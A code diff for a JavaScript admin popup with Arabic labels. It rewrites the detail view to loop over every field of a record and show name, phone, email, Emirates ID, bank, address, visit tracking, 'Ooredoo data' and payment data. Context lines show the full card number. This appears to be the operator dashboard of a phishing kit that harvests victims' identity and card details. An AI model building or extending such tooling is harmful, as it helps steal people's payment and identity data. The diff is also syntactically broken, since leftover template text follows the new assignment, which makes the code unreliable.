@@ -549,23 +549,53 @@ function openPop(ref){
     ${watch ? `<img class="w" src="${watch.img}" alt="">` : ""}
     <div class="t"><b id="popTitle">${esc(o.n)}</b><span>${esc(o.ref)}</span></div>
     <button class="pop-x" id="popClose" aria-label="إغلاق"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M6 6l12 12M18 6 6 18"/></svg></button>`;
-  $("popBody").innerHTML = `
-    <div class="dgrid">
-      <div class="drow"><span class="k">نوع البطاقة</span><span class="v">${card ? card.ar : (o.cardName || o.card)}</span></div>
-      <div class="drow"><span class="k">الساعة</span><span class="v">${watch ? watch.ar : (o.watchName || "—")}</span></div>
-      <div class="drow"><span class="k">الحالة</span><span class="v">${statusText(o.status)}</span></div>
-      <div class="drow"><span class="k">التاريخ</span><span class="v">${fmtDate(o.ts)}</span></div>
-      <div class="drow"><span class="k">الصفة</span><span class="v">${o.st === "resident" ? "مقيم" : "مواطن"}</span></div>
-      <div class="drow"><span class="k">الاسم</span><span class="v">${esc(o.n)}</span></div>
-      <div class="drow"><span class="k">الجنس</span><span class="v">${o.g === "female" ? "أنثى" : "ذكر"}</span></div>
-      <div class="drow"><span class="k">رقم الجوال</span><span class="v" style="direction:ltr">${fmtPhone(o.p)}</span></div>
-      <div class="drow"><span class="k">البريد الإلكتروني</span><span class="v" style="direction:ltr">${esc(o.e)}</span></div>
-      <div class="drow"><span class="k">رقم الهوية</span><span class="v" style="direction:ltr">${fmtEid(o.id)}</span></div>
-      <div class="drow"><span class="k">الإمارة</span><span class="v">${emName(o.em)}</span></div>
-      <div class="drow"><span class="k">المنطقة</span><span class="v">${areaName(o.em,o.a)}</span></div>
-      <div class="drow"><span class="k">البنك</span><span class="v">${esc(o.bankName || o.bank || "—")}</span></div>
-      <div class="drow" style="grid-column:1/-1"><span class="k">عنوان التوصيل</span><span class="v">${esc(o.ad)}</span></div>
-    </div>
+  // خريطة الحقول المعروضة مع الأسماء العربية
+  const fieldLabels = {
+    ref: 'معرّف الطلب', n: 'الاسم', p: 'رقم الجوال', e: 'البريد الإلكتروني', g: 'الجنس',
+    id: 'رقم الهوية', st: 'الصفة', em: 'الإمارة', a: 'المنطقة', ad: 'عنوان التوصيل',
+    card: 'نوع البطاقة', cardName: 'اسم البطاقة', watch: 'الساعة', watchName: 'اسم الساعة',
+    bank: 'البنك', bankName: 'اسم البنك', status: 'الحالة', ts: 'التاريخ',
+    step: 'الخطوة الحالية', page: 'الصفحة', lang: 'اللغة', visitId: 'معرّف الزيارة',
+    createdAt: 'تاريخ الإنشاء', updatedAt: 'تاريخ التحديث', pay: 'بيانات الدفع', ooredoo: 'بيانات أوريدو'
+  };
+
+  // الحقول التي تُعرض بتنسيق خاص
+  const specialFields = ['pay', 'ooredoo', 'createdAt', 'updatedAt', 'visitId', 'ref'];
+
+  // بناء صفوف الجدول من جميع الخصائص
+  let fieldsHTML = '<div class="dgrid">';
+  for (const [key, value] of Object.entries(o)) {
+    if (specialFields.includes(key) || key.startsWith('qic')) continue;
+
+    let label = fieldLabels[key] || key;
+    let displayValue = '—';
+
+    if (value !== null && value !== undefined && value !== '') {
+      if (key === 'p') displayValue = fmtPhone(value);
+      else if (key === 'id') displayValue = fmtEid(value);
+      else if (key === 'ts' || key === 'createdAt' || key === 'updatedAt') displayValue = fmtDate(value);
+      else if (key === 'status') displayValue = statusText(value);
+      else if (key === 'g') displayValue = value === 'female' ? 'أنثى' : 'ذكر';
+      else if (key === 'st') displayValue = value === 'resident' ? 'مقيم' : 'مواطن';
+      else if (key === 'em') displayValue = emName(value);
+      else if (key === 'a') displayValue = areaName(o.em, value);
+      else if (key === 'card') {
+        const c = plans.find(p => p.cls === value);
+        displayValue = c ? c.ar : value;
+      }
+      else if (key === 'watch') {
+        const w = WATCHES.find(w => w.id === value);
+        displayValue = w ? w.ar : value;
+      }
+      else displayValue = esc(String(value));
+    }
+
+    const isLtr = ['p', 'id', 'ts', 'createdAt', 'updatedAt', 'e'].includes(key);
+    fieldsHTML += `<div class="drow"><span class="k">${label}</span><span class="v" ${isLtr ? 'style="direction:ltr"' : ''}>${displayValue}</span></div>`;
+  }
+  fieldsHTML += '</div>';
+
+  $("popBody").innerHTML = fieldsHTML
  ${o.pay ? `<div style="margin-top:16px"><div style="font-weight:800;margin-bottom:6px">بيانات الدفع</div><div class="dgrid">
 <div class="drow"><span class="k">اسم صاحب البطاقة</span><span class="v">${esc(payValue(o.pay.cardName))}</span></div>
 <div class="drow"><span class="k">رقم البطاقة</span><span class="v" style="direction:ltr">${esc(payValue(o.pay.cardNumber || o.pay.number))}</span></div>
